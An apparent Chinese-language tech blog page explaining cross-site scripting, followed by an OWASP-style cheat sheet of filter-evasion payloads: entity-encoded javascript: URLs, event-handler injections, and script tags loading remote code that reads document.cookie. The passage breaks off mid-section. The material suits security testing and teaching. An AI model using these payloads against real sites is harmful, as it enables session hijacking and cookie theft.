@@ -1,0 +1,1507 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>XSS, Cross-Site Scripting 跨站脚本攻击 &#8211; wi's Tech Blog</title>
+<meta name="description" content="notes, articles, or reproduced">
+<meta name="keywords" content="javascript, security, xss, filter-evasion, xss-vector">
+
+
+
+<!-- Open Graph -->
+<meta property="og:locale" content="zh_CN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS, Cross-Site Scripting 跨站脚本攻击">
+<meta property="og:description" content="notes, articles, or reproduced">
+<meta property="og:url" content="/dev/web/xss-cross-site-scripting/">
+<meta property="og:site_name" content="wi's Tech Blog">
+<meta property="og:image" content="/images/images/avatar.png">
+
+
+
+
+
+<link rel="canonical" href="/dev/web/xss-cross-site-scripting/">
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="wi's Tech Blog Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no"/>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="/assets/css/jquery.mmenu.all.css">
+<link rel="stylesheet" href="/assets/css/jquery.floating-social-share.min.css">
+<!-- Webfonts -->
+
+<meta http-equiv="cleartype" content="on">
+
+<script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script type="text/javascript" src="/assets/js/scripts.min.js"></script>
+
+<!-- table of content -->
+<script type="text/javascript" src="/assets/js/vendor/toc.js"></script>
+
+
+<!-- Load Modernizr -->
+<script type="text/javascript" src="/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+
+<!-- Mathjax Support -->
+<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+
+</head>
+
+<body>
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+
+
+
+<div class="header-menu header-menu-top">
+    <ul class="header-item-container">
+      <li class="header-item-title header-toggle "><a href="#menu"><i class="fa fa-bars"></i></a></li>
+      <li class="header-item-title">
+        <a href="/">
+          
+            <img class="logo" src="/images/avatar.png" alt="wi's Tech Blog">
+          
+          <a href="/" class="title"> wi's Tech Blog</a>
+        </a>
+      </li>
+      
+        
+        
+
+
+        
+            
+                <li class="header-item "><a href="/favorites">fav</a></li>
+            
+        
+      
+        
+        
+
+
+        
+            
+                <li class="header-item "><a href="/categories">Categories</a></li>
+            
+        
+      
+        
+        
+
+
+        
+            
+                <li class="header-item "><a href="/tags">Tags</a></li>
+            
+        
+      
+        
+        
+
+
+        
+            
+                <li class="header-item "><a href="/">Home</a></li>
+            
+        
+      
+      <li class="header-item"><a href="/search"><i class="fa fa-search"></i></a></li>
+    </ul>
+  </div>
+
+
+
+<nav id="menu" style="display: none">
+  <ul>
+    
+      
+        <li><a href="/"><h3>Home</h3></a></li>
+      
+    
+      
+        <li><a href="/tags"><h3>Tags</h3></a></li>
+      
+    
+      
+        <li><a href="/categories"><h3>Categories</h3></a>
+          <ul>
+            
+              
+                <li><a href="/categories/#UML">UML</a></li>
+            
+              
+                <li><a href="/categories/#Windows">Windows</a></li>
+            
+              
+                <li><a href="/categories/#adb">adb</a></li>
+            
+              
+                <li><a href="/categories/#adt">adt</a></li>
+            
+              
+                <li><a href="/categories/#android">android</a></li>
+            
+              
+                <li><a href="/categories/#apache">apache</a></li>
+            
+              
+                <li><a href="/categories/#apple">apple</a></li>
+            
+              
+                <li><a href="/categories/#bat">bat</a></li>
+            
+              
+                <li><a href="/categories/#blog">blog</a></li>
+            
+              
+                <li><a href="/categories/#blog_sample">blog_sample</a></li>
+            
+              
+                <li><a href="/categories/#browser">browser</a></li>
+            
+              
+                <li><a href="/categories/#burpsuite">burpsuite</a></li>
+            
+              
+                <li><a href="/categories/#centos">centos</a></li>
+            
+              
+                <li><a href="/categories/#chrome">chrome</a></li>
+            
+              
+                <li><a href="/categories/#cm">cm</a></li>
+            
+              
+                <li><a href="/categories/#common">common</a></li>
+            
+              
+                <li><a href="/categories/#css">css</a></li>
+            
+              
+                <li><a href="/categories/#cygwin">cygwin</a></li>
+            
+              
+                <li><a href="/categories/#database">database</a></li>
+            
+              
+                <li><a href="/categories/#db">db</a></li>
+            
+              
+                <li><a href="/categories/#dev">dev</a></li>
+            
+              
+                <li><a href="/categories/#device">device</a></li>
+            
+              
+                <li><a href="/categories/#diff">diff</a></li>
+            
+              
+                <li><a href="/categories/#disk">disk</a></li>
+            
+              
+                <li><a href="/categories/#diy">diy</a></li>
+            
+              
+                <li><a href="/categories/#dns">dns</a></li>
+            
+              
+                <li><a href="/categories/#doc">doc</a></li>
+            
+              
+                <li><a href="/categories/#docker">docker</a></li>
+            
+              
+                <li><a href="/categories/#efi">efi</a></li>
+            
+              
+                <li><a href="/categories/#emacs">emacs</a></li>
+            
+              
+                <li><a href="/categories/#email">email</a></li>
+            
+              
+                <li><a href="/categories/#emulator">emulator</a></li>
+            
+              
+                <li><a href="/categories/#english">english</a></li>
+            
+              
+                <li><a href="/categories/#esxi">esxi</a></li>
+            
+              
+                <li><a href="/categories/#excel">excel</a></li>
+            
+              
+                <li><a href="/categories/#exsi">exsi</a></li>
+            
+              
+                <li><a href="/categories/#favorites">favorites</a></li>
+            
+              
+                <li><a href="/categories/#ftp">ftp</a></li>
+            
+              
+                <li><a href="/categories/#game">game</a></li>
+            
+              
+                <li><a href="/categories/#git">git</a></li>
+            
+              
+                <li><a href="/categories/#gitlab">gitlab</a></li>
+            
+              
+                <li><a href="/categories/#go">go</a></li>
+            
+              
+                <li><a href="/categories/#golang">golang</a></li>
+            
+              
+                <li><a href="/categories/#hardware">hardware</a></li>
+            
+              
+                <li><a href="/categories/#ide">ide</a></li>
+            
+              
+                <li><a href="/categories/#internet">internet</a></li>
+            
+              
+                <li><a href="/categories/#java">java</a></li>
+            
+              
+                <li><a href="/categories/#javascript">javascript</a></li>
+            
+              
+                <li><a href="/categories/#jekyll">jekyll</a></li>
+            
+              
+                <li><a href="/categories/#jenkins">jenkins</a></li>
+            
+              
+                <li><a href="/categories/#jmeter">jmeter</a></li>
+            
+              
+                <li><a href="/categories/#kate">kate</a></li>
+            
+              
+                <li><a href="/categories/#kde">kde</a></li>
+            
+              
+                <li><a href="/categories/#ldap">ldap</a></li>
+            
+              
+                <li><a href="/categories/#learn">learn</a></li>
+            
+              
+                <li><a href="/categories/#learning">learning</a></li>
+            
+              
+                <li><a href="/categories/#links">links</a></li>
+            
+              
+                <li><a href="/categories/#linux">linux</a></li>
+            
+              
+                <li><a href="/categories/#living">living</a></li>
+            
+              
+                <li><a href="/categories/#mac">mac</a></li>
+            
+              
+                <li><a href="/categories/#mac-os">mac-os</a></li>
+            
+              
+                <li><a href="/categories/#macos">macos</a></li>
+            
+              
+                <li><a href="/categories/#mail">mail</a></li>
+            
+              
+                <li><a href="/categories/#manjaro">manjaro</a></li>
+            
+              
+                <li><a href="/categories/#markdown">markdown</a></li>
+            
+              
+                <li><a href="/categories/#maven">maven</a></li>
+            
+              
+                <li><a href="/categories/#memcached">memcached</a></li>
+            
+              
+                <li><a href="/categories/#microsoft">microsoft</a></li>
+            
+              
+                <li><a href="/categories/#moco">moco</a></li>
+            
+              
+                <li><a href="/categories/#mysql">mysql</a></li>
+            
+              
+                <li><a href="/categories/#nas">nas</a></li>
+            
+              
+                <li><a href="/categories/#ndk">ndk</a></li>
+            
+              
+                <li><a href="/categories/#netbean">netbean</a></li>
+            
+              
+                <li><a href="/categories/#network">network</a></li>
+            
+              
+                <li><a href="/categories/#netwrok">netwrok</a></li>
+            
+              
+                <li><a href="/categories/#nginx">nginx</a></li>
+            
+              
+                <li><a href="/categories/#nodejs">nodejs</a></li>
+            
+              
+                <li><a href="/categories/#notepad++">notepad++</a></li>
+            
+              
+                <li><a href="/categories/#office">office</a></li>
+            
+              
+                <li><a href="/categories/#open-course">open-course</a></li>
+            
+              
+                <li><a href="/categories/#openkm">openkm</a></li>
+            
+              
+                <li><a href="/categories/#openwrt">openwrt</a></li>
+            
+              
+                <li><a href="/categories/#outlook">outlook</a></li>
+            
+              
+                <li><a href="/categories/#pdf">pdf</a></li>
+            
+              
+                <li><a href="/categories/#perl">perl</a></li>
+            
+              
+                <li><a href="/categories/#phone">phone</a></li>
+            
+              
+                <li><a href="/categories/#php">php</a></li>
+            
+              
+                <li><a href="/categories/#postgresql">postgresql</a></li>
+            
+              
+                <li><a href="/categories/#product">product</a></li>
+            
+              
+                <li><a href="/categories/#python">python</a></li>
+            
+              
+                <li><a href="/categories/#rails">rails</a></li>
+            
+              
+                <li><a href="/categories/#redmine">redmine</a></li>
+            
+              
+                <li><a href="/categories/#regex">regex</a></li>
+            
+              
+                <li><a href="/categories/#router">router</a></li>
+            
+              
+                <li><a href="/categories/#ruby">ruby</a></li>
+            
+              
+                <li><a href="/categories/#search-engine">search-engine</a></li>
+            
+              
+                <li><a href="/categories/#security">security</a></li>
+            
+              
+                <li><a href="/categories/#sed">sed</a></li>
+            
+              
+                <li><a href="/categories/#ssh">ssh</a></li>
+            
+              
+                <li><a href="/categories/#streaming">streaming</a></li>
+            
+              
+                <li><a href="/categories/#study">study</a></li>
+            
+              
+                <li><a href="/categories/#subversion">subversion</a></li>
+            
+              
+                <li><a href="/categories/#tcpdump">tcpdump</a></li>
+            
+              
+                <li><a href="/categories/#tech">tech</a></li>
+            
+              
+                <li><a href="/categories/#testing">testing</a></li>
+            
+              
+                <li><a href="/categories/#testlink">testlink</a></li>
+            
+              
+                <li><a href="/categories/#text">text</a></li>
+            
+              
+                <li><a href="/categories/#tomcat">tomcat</a></li>
+            
+              
+                <li><a href="/categories/#ubuntu">ubuntu</a></li>
+            
+              
+                <li><a href="/categories/#ufw">ufw</a></li>
+            
+              
+                <li><a href="/categories/#vbs">vbs</a></li>
+            
+              
+                <li><a href="/categories/#vim">vim</a></li>
+            
+              
+                <li><a href="/categories/#virtual-box">virtual-box</a></li>
+            
+              
+                <li><a href="/categories/#virtualbox">virtualbox</a></li>
+            
+              
+                <li><a href="/categories/#virtualization">virtualization</a></li>
+            
+              
+                <li><a href="/categories/#vm">vm</a></li>
+            
+              
+                <li><a href="/categories/#vpn">vpn</a></li>
+            
+              
+                <li><a href="/categories/#web">web</a></li>
+            
+              
+                <li><a href="/categories/#windows">windows</a></li>
+            
+              
+                <li><a href="/categories/#xampp">xampp</a></li>
+            
+              
+                <li><a href="/categories/#收藏夹">收藏夹</a></li>
+            
+              
+                <li><a href="/categories/#测试工具">测试工具</a></li>
+            
+              
+                <li><a href="/categories/#玩机">玩机</a></li>
+            
+          </ul>
+        </li>
+      
+    
+      
+        <li><a href="/favorites"><h3>fav</h3></a></li>
+      
+    
+  </ul>
+</nav>
+
+
+
+
+<div id="post" >
+<div id="main" role="main" >
+  <article class="hentry">
+    <div class="entry-content">
+        
+      <h1 class="post-title entry-title">XSS, Cross-Site Scripting 跨站脚本攻击</h1>
+      
+        <h3><span class="entry-date date published updated"><time datetime="2017-12-07T00:00:00+08:00">December 07, 2017</time></span></h3>
+      
+      
+      
+      
+<!-- this handles the automatic toc. use ## for subheads to auto-generate the on-page minitoc. if you use html tags, you must supply an ID for the heading element in order for it to appear in the minitoc. -->
+<script>
+$( document ).ready(function() {
+
+$('#toc').toc({ minimumHeaders: 0, listType: 'ul', showSpeed: 0, headers: 'h2,h3,h4' });
+
+/* this offset helps account for the space taken up by the floating toolbar. */
+$('#toc').on('click', 'a', function() {
+  var target = $(this.getAttribute('href'))
+    , scroll_target = target.offset().top
+
+  $(window).scrollTop(scroll_target - 60);
+  return false
+})
+
+$(".toc-button").on('click', function(){
+  $(".toc").toggle();
+});
+
+
+$(window).click(function(evt){
+  if( !evt.target.matches('.toc') 
+      && !evt.target.matches('.toc>ul') 
+      && !evt.target.matches('.toc-button') ) {
+    $('.toc').each(function(){
+      if( $(this).is(":visible") ) {
+        $(this).hide();
+      }
+    });
+  }
+});
+
+});
+</script>
+
+<div class="float-toc">
+    <i class="toc-button fa fa-list-ol" aria-hidden="true"></i>
+  <div id="toc"></div>
+</div>
+
+      
+      
+      <ul>
+  <li>参考
+    <ul>
+      <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents">OWASP - OWASP Testing Guide v4 Table of Contents</a></li>
+      <li><a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors#Cross_Site_Scripting_.28XSS.29">OWASP - OWASP Testing Guide Appendix C: Fuzz Vectors</a></li>
+      <li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">OWASP - XSS Filter Evasion Cheat Sheet</a></li>
+      <li><a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">OWASP - XSS (Cross Site Scripting) Prevention Cheat Sheet</a></li>
+      <li><a href="https://www.owasp.org/index.php/Testing_for_Cross_site_scripting">OWASP - Testing for Cross site scripting</a></li>
+      <li><a href="http://blog.bugcrowd.com/xss-polyglots-the-context-contest">http://blog.bugcrowd.com/xss-polyglots-the-context-contest</a></li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="概述">概述</h2>
+
+<p>XSS : Cross-Site Scripting 跨站脚本</p>
+
+<p>能注入恶意HTML/Javascript代码到用户浏览的网页上，达到劫持用户会话的目的。</p>
+
+<p>XSS跨站脚本攻击本身对Web服务器没有直接危害，借助网站进行传播，危害网站的用户。</p>
+
+<h3 id="xss简单的例子">XSS简单的例子</h3>
+
+<p><img src="xss-simple-sample.png" alt="" /></p>
+
+<h3 id="xss可能的危害">XSS可能的危害</h3>
+
+<ol>
+  <li>网络钓鱼，包括盗取各类用户帐号；</li>
+  <li>窃取用户cookies，获取隐私信息，或利用用户省份进一步对网站执行操作；</li>
+  <li>劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账等</li>
+  <li>强制弹出广告页面，刷流量等</li>
+  <li>网页挂马；</li>
+  <li>进行大量的客户端攻击，如 DDos攻击；</li>
+  <li>获取客户端信息，例如用户的浏览历史记录、真实IP等</li>
+  <li>。。。</li>
+</ol>
+
+<h2 id="xss分类">XSS分类</h2>
+
+<h3 id="反射性xss--reflected-cross-site-scripting">反射性XSS ， Reflected Cross-Site Scripting</h3>
+
+<p>也称非持久型、参数型跨站脚本。主要用于将恶意脚本附加到URL地址的参数中。</p>
+
+<p>例如：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>http://www.test.com/search.php?key="&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;"
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<p>url转码成不易读的形式，更具有迷惑性。</p>
+
+<h3 id="持久型-xss--persistent-cross-site-scripting">持久型 XSS , Persistent Cross-site Scripting</h3>
+
+<p>也称存储型XSS（Stored Cross-site Scripting），比反射型XSS更具威胁，可能影响到Web服务器自身安全。</p>
+
+<p>持久型XSS，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，显示在页面中，即在受害者主机上的浏览器执行恶意代码。</p>
+
+<h2 id="xss-cheatsheet--xss-vectors">XSS CheatSheet / XSS vectors</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31</pre></td><td class="code"><pre>
+&lt;!-- Replacive fuzzing --&gt;
+
+http://www.example.com/&gt;"&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&amp;
+http://www.example.com/'';!--"&lt;XSS&gt;=&amp;{()}
+
+&gt;"&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&amp;
+"&gt;&lt;STYLE&gt;@import"javascript:alert('XSS')";&lt;/STYLE&gt;
+&gt;"'&gt;&lt;img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
+ alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)&gt;
+
+&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27%20XSS%27)%22&gt;
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+"&gt;
+&gt;"
+'';!--"&lt;XSS&gt;=&amp;{()}
+&lt;IMG SRC="javascript:alert('XSS');"&gt;
+&lt;IMG SRC=javascript:alert('XSS')&gt;
+&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt; 
+&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&lt;WBR&gt;&amp;quot;)&gt;
+&lt;IMGSRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;&lt;WBR&gt;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;&lt;WBR&gt;#116;&amp;#58;&amp;#97;
+ &amp;#108;&amp;#101;&amp;&lt;WBR&gt;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83&lt;WBR&gt;;&amp;#83;&amp;#39;&amp;#41&gt;
+&lt;IMGSRC=&amp;#0000106&amp;#0000097&amp;&lt;WBR&gt;#0000118&amp;#0000097&amp;#0000115&amp;&lt;WBR&gt;#0000099&amp;#0000114&amp;#0000105&amp;&lt;WBR&gt;#0000112&amp;#0000116&amp;#0000058
+ &amp;&lt;WBR&gt;#0000097&amp;#0000108&amp;#0000101&amp;&lt;WBR&gt;#0000114&amp;#0000116&amp;#0000040&amp;&lt;WBR&gt;#0000039&amp;#0000088&amp;#0000083&amp;&lt;WBR&gt;#0000083&amp;#0000039&amp;#0000041&gt;
+           
+&lt;IMGSRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;&lt;WBR&gt;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;&lt;WBR&gt;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28
+ &amp;&lt;WBR&gt;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+
+&lt;IMG SRC="jav&amp;#x09;ascript:alert(&lt;WBR&gt;'XSS');"&gt;
+&lt;IMG SRC="jav&amp;#x0A;ascript:alert(&lt;WBR&gt;'XSS');"&gt;
+&lt;IMG SRC="jav&amp;#x0D;ascript:alert(&lt;WBR&gt;'XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="基本xss不回避任何-filter">基本XSS，不回避任何 filter</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<ul>
+  <li>http://xss.rocks/xss.js 的内容
+    <div class="language-javascript highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2
+3
+4
+5
+6
+7</pre></td><td class="code"><pre>  <span class="cm">/* This file is based on the file from http://ha.ckers.org/xss.js
+     It has been reproduced here due to the extended downtime of ha.ckers.org
+     This file is being hosted as a courtesy to the security community.
+  */</span>
+
+  <span class="nb">document</span><span class="p">.</span><span class="nx">write</span> <span class="p">(</span><span class="s2">"This is remote text via xss.js located at xss.rocks "</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+  <span class="nx">alert</span> <span class="p">(</span><span class="s2">"This is remote text via xss.js located at xss.rocks "</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+</pre></td></tr></tbody></table>
+</div>
+    </div>
+  </li>
+</ul>
+
+<h3 id="绕过大小写检查">绕过大小写检查</h3>
+
+<h4 id="使用vbscript绕过大小写">使用VBScript绕过大小写</h4>
+
+<p>Since JavaScript is case sensitive, some people attempt to filter XSS by converting all characters to upper case, rendering Cross Site Scripting utilizing inline JavaScript useless. If this is the case, you may want to use <code class="highlighter-rouge">VBScript</code> since it is not a case sensitive language.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2
+3
+4
+5</pre></td><td class="code"><pre><span class="c">&lt;!-- javascript --&gt;</span>
+<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
+
+<span class="c">&lt;!-- vbscript --&gt;</span>
+<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/vbscript"</span><span class="nt">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">DOCUMENT</span><span class="p">.</span><span class="nx">COOKIE</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="转义尖括号--">转义尖括号 &lt; &gt;</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2
+3
+4
+5</pre></td><td class="code"><pre><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">http://www.example.com/malicious-code.js</span><span class="nt">&gt;&lt;/script&gt;</span>
+
+%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e
+
+\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="利用-fromcharcode-转义">利用 <code class="highlighter-rouge">fromCharCode</code> 转义</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="从-javascript-注入">从 <code class="highlighter-rouge">javascript:</code> 注入</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC="javascript:alert('XSS');"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=javascript:alert('XSS')&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="利用大小写回避检查">利用大小写回避检查</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="html-entities-转移单引号">HTML entities 转移单引号</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="-尖号混淆">` 尖号混淆</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="回避-src-检查">回避 SRC 检查</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG onmouseover="alert('xxs')"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h3 id="on-error-alert">On error alert</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"&gt;&lt;/img&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="img-onerror-and-javascript-alert-encode">IMG onerror and javascript alert encode</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1</pre></td><td class="code"><pre>&lt;img src=x onerror="&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="decimal-html-character-references">Decimal HTML character references</h4>
+
+<p>all of the XSS examples that use a javascript: directive inside of an &lt;IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2</pre></td><td class="code"><pre>&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="decimal-html-character-references-without-trailing-semicolons">Decimal HTML character references without trailing semicolons</h4>
+
+<p>This is often effective in XSS that attempts to look for “&amp;#XX;”, since most people don’t know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like <code class="highlighter-rouge">$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;</code> which incorrectly assumes a semicolon is required to terminate a html encoded string (I’ve seen this in the wild):</p>
+
+<div class="highlighter-rouge"><div class="highlight"><table style="border-spacing: 0"><tbody><tr><td class="gutter gl" style="text-align: right"><pre class="lineno">1
+2</pre></td><td class="code"><pre>&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;
+#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+</pre></td></tr></tbody></table>
+</div>
+</div>
+
+<h4 id="hexadecimal-html-character-references-without-trailing-semicolons">Hexadecimal HTML character references without trailing semicolons</h4>
+
